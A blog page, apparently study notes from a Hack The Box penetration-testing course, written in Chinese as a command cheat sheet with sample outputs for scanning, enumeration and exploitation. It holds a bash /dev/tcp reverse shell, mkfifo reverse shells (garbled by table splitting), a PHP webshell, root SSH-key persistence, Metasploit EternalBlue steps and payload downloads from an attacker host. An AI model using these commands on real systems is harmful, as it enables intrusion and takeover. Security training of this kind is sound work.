@@ -1,0 +1,738 @@
+
+<!DOCTYPE html>
+<html lang="en ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Salve || tools</title>
+    <meta name="author" content="TiAmo">
+    <meta name="description" content="Buona notte ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/avatar.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>加载过慢请开启缓存(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Salve</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/like/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/like/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+        <a target="_blank" rel="noopener" href="https://en.korilin.com">
+            <span>
+                <a-icon type="compass" theme="filled" />
+            </span>
+            <span>英文博客</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Salve</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/like/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/like/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+            <a target="_blank" rel="noopener" href="https://en.korilin.com">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="compass" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">英文博客</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>tools </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2023/6/11
+        </span>
+
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/tool" style=color:#03a9f4>
+                    tool
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>常规</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>sudo openvpn user.ovpn</code></td>
+<td>连接到虚拟专用网络</td>
+</tr>
+<tr>
+<td><code>ifconfig</code>&#x2F;<code>ip a</code></td>
+<td>显示我们的 IP 地址</td>
+</tr>
+<tr>
+<td><code>netstat -rn</code></td>
+<td>显示可通过 VPN 访问的网络</td>
+</tr>
+<tr>
+<td><code>ssh user@10.10.10.10</code></td>
+<td>通过 SSH 连接到远程服务器</td>
+</tr>
+<tr>
+<td><code>ftp 10.129.42.253</code></td>
+<td>FTP 到远程服务器</td>
+</tr>
+<tr>
+<td><strong>鞘鞘</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>tmux</code></td>
+<td>启动 tmux</td>
+</tr>
+<tr>
+<td><code>ctrl+b</code></td>
+<td>TMUX：默认前缀</td>
+</tr>
+<tr>
+<td><code>prefix c</code></td>
+<td>TMUX：新窗口</td>
+</tr>
+<tr>
+<td><code>prefix 1</code></td>
+<td>TMUX：切换到窗口 （<code>1</code>)</td>
+</tr>
+<tr>
+<td><code>prefix shift+%</code></td>
+<td>TMUX：垂直拆分窗格</td>
+</tr>
+<tr>
+<td><code>prefix shift+&quot;</code></td>
+<td>TMUX：水平拆分窗格</td>
+</tr>
+<tr>
+<td><code>prefix -&gt;</code></td>
+<td>TMUX：切换到右窗格</td>
+</tr>
+<tr>
+<td><strong>维姆</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>vim file</code></td>
+<td>VIM：使用 VIM 打开<code>file</code></td>
+</tr>
+<tr>
+<td><code>esc+i</code></td>
+<td>VIM：进入模式<code>insert</code></td>
+</tr>
+<tr>
+<td><code>esc</code></td>
+<td>VIM：返回模式<code>normal</code></td>
+</tr>
+<tr>
+<td><code>x</code></td>
+<td>vim：剪切字符</td>
+</tr>
+<tr>
+<td><code>dw</code></td>
+<td>vim：剪切词</td>
+</tr>
+<tr>
+<td><code>dd</code></td>
+<td>vim：切割整条线</td>
+</tr>
+<tr>
+<td><code>yw</code></td>
+<td>vim：复制单词</td>
+</tr>
+<tr>
+<td><code>yy</code></td>
+<td>vim：复制整行</td>
+</tr>
+<tr>
+<td><code>p</code></td>
+<td>vim：粘贴</td>
+</tr>
+<tr>
+<td><code>:1</code></td>
+<td>vim：转到第 1 行。</td>
+</tr>
+<tr>
+<td><code>:w</code></td>
+<td>vim：写入文件“即保存”</td>
+</tr>
+<tr>
+<td><code>:q</code></td>
+<td>vim：退出</td>
+</tr>
+<tr>
+<td><code>:q!</code></td>
+<td>vim：退出而不保存</td>
+</tr>
+<tr>
+<td><code>:wq</code></td>
+<td>vim：写和退出</td>
+</tr>
+</tbody></table>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><table>
+<thead>
+<tr>
+<th><strong>命令</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>服务扫描</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>nmap 10.129.42.253</code></td>
+<td>在 IP 上运行 nmap</td>
+</tr>
+<tr>
+<td><code>nmap -sV -sC -p- 10.129.42.253</code></td>
+<td>在 IP 上运行 nmap 脚本扫描</td>
+</tr>
+<tr>
+<td><code>locate scripts/citrix</code></td>
+<td>列出各种可用的 nmap 脚本</td>
+</tr>
+<tr>
+<td><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></td>
+<td>在 IP 上运行 nmap 脚本</td>
+</tr>
+<tr>
+<td><code>netcat 10.10.10.10 22</code></td>
+<td>抓取开放端口的横幅</td>
+</tr>
+<tr>
+<td><code>smbclient -N -L \\\\10.129.42.253</code></td>
+<td>列出中小企业共享</td>
+</tr>
+<tr>
+<td><code>smbclient \\\\10.129.42.253\\users</code></td>
+<td>连接到 SMB 共享</td>
+</tr>
+<tr>
+<td><code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code></td>
+<td>扫描 IP 上的 SNMP</td>
+</tr>
+<tr>
+<td><code>onesixtyone -c dict.txt 10.129.42.254</code></td>
+<td>暴力破解 SNMP 机密字符串</td>
+</tr>
+<tr>
+<td><strong>网络枚举</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code></td>
+<td>在网站上运行目录扫描</td>
+</tr>
+<tr>
+<td><code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code></td>
+<td>在网站上运行子域扫描</td>
+</tr>
+<tr>
+<td><code>curl -IL https://www.inlanefreight.com</code></td>
+<td>抓取网站横幅</td>
+</tr>
+<tr>
+<td><code>whatweb 10.10.10.121</code></td>
+<td>列出有关 Web 服务器&#x2F;证书的详细信息</td>
+</tr>
+<tr>
+<td><code>curl 10.10.10.121/robots.txt</code></td>
+<td>列出潜在目录<code>robots.txt</code></td>
+</tr>
+<tr>
+<td><code>ctrl+U</code></td>
+<td>查看页面源代码（在火狐中）</td>
+</tr>
+<tr>
+<td><strong>公共漏洞利用</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>searchsploit openssh 7.2</code></td>
+<td>搜索 Web 应用程序的公共漏洞</td>
+</tr>
+<tr>
+<td><code>msfconsole</code></td>
+<td>MSF：启动 Metasploit 框架</td>
+</tr>
+<tr>
+<td><code>search exploit eternalblue</code></td>
+<td>MSF：在 MSF 中搜索公共漏洞</td>
+</tr>
+<tr>
+<td><code>use exploit/windows/smb/ms17_010_psexec</code></td>
+<td>MSF：开始使用 MSF 模块</td>
+</tr>
+<tr>
+<td><code>show options</code></td>
+<td>MSF：显示 MSF 模块所需的选项</td>
+</tr>
+<tr>
+<td><code>set RHOSTS 10.10.10.40</code></td>
+<td>MSF：设置 MSF 模块选项的值</td>
+</tr>
+<tr>
+<td><code>check</code></td>
+<td>MSF：测试目标服务器是否易受攻击</td>
+</tr>
+<tr>
+<td><code>exploit</code></td>
+<td>MSF：在目标服务器上运行漏洞易受攻击</td>
+</tr>
+<tr>
+<td><strong>使用外壳</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>nc -lvnp 1234</code></td>
+<td>在本地端口上启动侦听器<code>nc</code></td>
+</tr>
+<tr>
+<td><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;</code></td>
+<td>从远程服务器发送反向外壳</td>
+</tr>
+<tr>
+<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
+<td>&#x2F;bin&#x2F;sh -i 2&gt;&amp;1</td>
+</tr>
+<tr>
+<td>&#96;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f</td>
+<td>&#x2F;bin&#x2F;bash -i 2&gt;&amp;1</td>
+</tr>
+<tr>
+<td><code>nc 10.10.10.1 1234</code></td>
+<td>连接到远程服务器上启动的绑定外壳</td>
+</tr>
+<tr>
+<td><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></td>
+<td>升级外壳 TTY （1）</td>
+</tr>
+<tr>
+<td><code>ctrl+z</code>然后然后是两次<code>stty raw -echo``fg``enter</code></td>
+<td>升级外壳 TTY （2）</td>
+</tr>
+<tr>
+<td><code>echo &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]);?&gt;&quot; &gt; /var/www/html/shell.php</code></td>
+<td>创建一个 webshell php 文件</td>
+</tr>
+<tr>
+<td><code>curl http://SERVER_IP:PORT/shell.php?cmd=id</code></td>
+<td>在上传的 Web 外壳上执行命令</td>
+</tr>
+<tr>
+<td><strong>权限提升</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>./linpeas.sh</code></td>
+<td>运行脚本以枚举远程服务器<code>linpeas</code></td>
+</tr>
+<tr>
+<td><code>sudo -l</code></td>
+<td>列出可用权限<code>sudo</code></td>
+</tr>
+<tr>
+<td><code>sudo -u user /bin/echo Hello World!</code></td>
+<td>运行命令<code>sudo</code></td>
+</tr>
+<tr>
+<td><code>sudo su -</code></td>
+<td>切换到根用户（如果我们有权访问<code>sudo su</code>)</td>
+</tr>
+<tr>
+<td><code>sudo su user -</code></td>
+<td>切换到用户（如果我们有权访问<code>sudo su</code>)</td>
+</tr>
+<tr>
+<td><code>ssh-keygen -f key</code></td>
+<td>创建新的 SSH 密钥</td>
+</tr>
+<tr>
+<td><code>echo &quot;ssh-rsa AAAAB...SNIP...M= user@parrot&quot; &gt;&gt; /root/.ssh/authorized_keys</code></td>
+<td>将生成的公钥添加到用户</td>
+</tr>
+<tr>
+<td><code>ssh root@10.10.10.10 -i key</code></td>
+<td>使用生成的私钥通过 SSH 连接到服务器</td>
+</tr>
+<tr>
+<td><strong>传输文件</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>python3 -m http.server 8000</code></td>
+<td>启动本地网络服务器</td>
+</tr>
+<tr>
+<td><code>wget http://10.10.14.1:8000/linpeas.sh</code></td>
+<td>从我们的本地计算机下载远程服务器上的文件</td>
+</tr>
+<tr>
+<td><code>curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</code></td>
+<td>从我们的本地计算机下载远程服务器上的文件</td>
+</tr>
+<tr>
+<td><code>scp linenum.sh user@remotehost:/tmp/linenum.sh</code></td>
+<td>使用（需要 SSH 访问）将文件传输到远程服务器<code>scp</code></td>
+</tr>
+<tr>
+<td><code>base64 shell -w 0</code></td>
+<td>将文件转换为<code>base64</code></td>
+</tr>
+<tr>
+<td>&#96;echo f0VMR…SNIO…InmDwU</td>
+<td>base64 -d &gt; shell&#96;</td>
+</tr>
+<tr>
+<td><code>md5sum shell</code></td>
+<td>检查文件以确保其转换正确<code>md5sum</code></td>
+</tr>
+</tbody></table>
+<h3 id="网络枚举：gobuster"><a href="#网络枚举：gobuster" class="headerlink" title="网络枚举：gobuster"></a>网络枚举：gobuster</h3><p>发现 Web 应用程序后，始终值得检查一下我们是否可以在 Web 服务器上发现任何不用于公共访问的隐藏文件或目录。我们可以使用<a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf">ffuf</a>或<a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster">GoBuster</a>之类的工具来执行此目录枚举。有时我们会发现隐藏的功能或页面&#x2F;目录暴露敏感数据，可以利用这些数据访问 Web 应用程序，甚至在 Web 服务器本身上远程执行代码。</p>
+<p>GoBuster是一个多功能工具，允许执行DNS，vhost和目录暴力强制。该工具具有其他功能，例如枚举公有 AWS S3 存储桶。出于本模块的目的，我们对使用 switch 指定的目录（和文件）暴力破解模式感兴趣。让我们使用单词列表运行一个简单的扫描。<code>dir``dirb``common.txt</code></p>
+<p>  目录&#x2F;文件枚举</p>
+<pre><code>Tanin@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.121/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/11 21:47:25 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/index.php (Status: 200)
+/server-status (Status: 403)
+/wordpress (Status: 301)
+===============================================================
+2020/12/11 21:47:46 Finished
+===============================================================
+</code></pre>
+<h4 id="DNS-子域枚举"><a href="#DNS-子域枚举" class="headerlink" title="DNS 子域枚举"></a>DNS 子域枚举</h4><p>子域上还可能托管基本资源，例如管理面板或具有可被利用的附加功能的应用程序。我们可以使用标志来枚举给定域的可用子域来指定 DNS 模式。首先，让我们克隆 SecLists GitHub <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">存储库</a>，其中包含许多用于模糊测试和利用的有用列表：<code>GoBuster``dns</code></p>
+<h4 id="安装安全列表"><a href="#安装安全列表" class="headerlink" title="安装安全列表"></a>安装安全列表</h4><p>  安装安全列表</p>
+<pre><code>Tanin@htb[/htb]$ git clone https://github.com/danielmiessler/SecLists
+</code></pre>
+<p>  安装安全列表</p>
+<pre><code>Tanin@htb[/htb]$ sudo apt install seclists -y
+</code></pre>
+<p>接下来，将 DNS 服务器（如 1.1.1.1）添加到文件中。我们将针对域名，虚构的货运和物流公司的网站。<code>/etc/resolv.conf``inlanefreight.com</code></p>
+<p>  安装安全列表</p>
+<pre><code>Tanin@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Domain:     inlanefreight.com
+[+] Threads:    10
+[+] Timeout:    1s
+[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
+===============================================================
+2020/12/17 23:08:55 Starting gobuster
+===============================================================
+Found: blog.inlanefreight.com
+Found: customer.inlanefreight.com
+Found: my.inlanefreight.com
+Found: ns1.inlanefreight.com
+Found: ns2.inlanefreight.com
+Found: ns3.inlanefreight.com
+===============================================================
+2020/12/17 23:10:34 Finished
+===============================================================
+</code></pre>
+<p>这次扫描揭示了几个有趣的子域，我们可以进一步检查。<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/details/54">使用 Ffuf 攻击 Web 应用程序</a>模块详细介绍了 Web 枚举和模糊测试。</p>
+<h4 id="Whatweb"><a href="#Whatweb" class="headerlink" title="Whatweb"></a>Whatweb</h4><p>我们可以使用 命令行工具 .这些信息可以帮助我们查明正在使用的技术并开始搜索潜在的漏洞。<code>whatweb</code></p>
+<pre><code>Tanin@htb[/htb]$ whatweb 10.10.10.121
+
+http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
+</code></pre>
+<p><code>Whatweb</code>是一个方便的工具，包含许多功能来自动执行网络上的 Web 应用程序枚举。</p>
+<pre><code>Tanin@htb[/htb]$ whatweb --no-errors 10.10.10.0/24
+
+http://10.10.10.11 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.11], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
+http://10.10.10.100 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.100], Title[File Sharing Service]
+http://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]
+http://10.10.10.247 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@cross-fit.htb], Frame, HTML5, HTTPServer[OpenBSD httpd], IP[10.10.10.247], JQuery[3.3.1], PHP[7.4.12], Script, Title[Fine Wines], X-Powered-By[PHP/7.4.12], X-UA-Compatible[ie=edge]
+</code></pre>
+<h2 id="查找公共漏洞"><a href="#查找公共漏洞" class="headerlink" title="查找公共漏洞"></a>查找公共漏洞</h2><p>许多工具可以帮助我们搜索在枚举阶段可能遇到的各种应用程序和服务的公共漏洞。一种方法是谷歌应用程序名称，看看我们是否得到任何结果：<code>exploit</code></p>
+<p>为此目的的一个众所周知的工具是 ，我们可以用来搜索任何应用程序的公共漏洞&#x2F;漏洞。我们可以用以下命令安装它：<code>searchsploit</code></p>
+<pre><code>Tanin@htb[/htb]$ sudo apt install exploitdb -y
+</code></pre>
+<pre><code>Tanin@htb[/htb]$ searchsploit openssh 7.2
+
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                               |  Path
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
+OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
+OpenSSH &lt; 7.4 - &#39;UsePrivilegeSeparation Disabled&#39; Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
+OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
+OpenSSH &lt; 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
+OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
+----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</code></pre>
+<h3 id="权限提升：LinEnum"><a href="#权限提升：LinEnum" class="headerlink" title="权限提升：LinEnum"></a>权限提升：LinEnum</h3><p> <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></p>
+<h3 id="HASH"><a href="#HASH" class="headerlink" title="HASH:"></a>HASH:</h3><ul>
+<li>hashcat</li>
+<li>CeWL</li>
+</ul>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
